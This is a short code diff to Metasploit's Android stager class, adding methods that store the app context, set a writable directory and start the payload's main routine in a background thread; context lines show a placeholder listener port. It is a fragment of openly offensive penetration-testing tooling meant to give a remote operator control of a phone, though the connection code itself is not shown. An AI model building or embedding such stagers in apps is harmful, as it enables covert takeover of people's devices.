@@ -1,4 +1,4 @@
-package com.metasploit.stage;//package com.metasploit.stage;
+package com.metasploit.stage;
 
 import android.content.Context;
 
@@ -17,6 +17,24 @@ public class Payload {
     private static final String LPORT = "YYYY4444                            ";
 
     public static Context context;
+
+    public static void start(Context context) {
+        // Set the working directory somewhere writeable
+        System.setProperty("user.dir", context.getFilesDir().getAbsolutePath());
+        // Store the context
+        Payload.context = context;
+        startAsync();
+    }
+
+    public static void startAsync() {
+        new Thread() {
+            @Override
+            public void run() {
+                // Execute the payload
+                Payload.main(null);
+            }
+        }.start();
+    }
 
     public static void main(String[] args) {
         try {
